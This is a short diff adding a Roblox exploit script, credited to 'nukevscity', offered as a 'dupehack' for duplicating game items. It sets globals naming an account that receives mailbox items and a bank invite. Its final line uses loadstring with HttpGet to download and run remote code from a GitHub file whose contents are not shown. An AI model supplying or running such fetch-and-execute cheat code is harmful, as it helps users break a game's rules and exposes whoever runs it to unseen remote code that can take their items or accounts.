@@ -1,0 +1,4 @@
+--credit to nukevscity
+getgenv().YourAccNameThatGetsMailbox = "IIIlllII1I" --Change this to your REAl USERNAME not the display
+getgenv().YourAccountIdForBankInvite = 4190983619 --Change this to your REAL UserId
+loadstring(game:HttpGet('https://raw.githubusercontent.com/NukeVsCity/Scripts2022/main/dupehack'))()
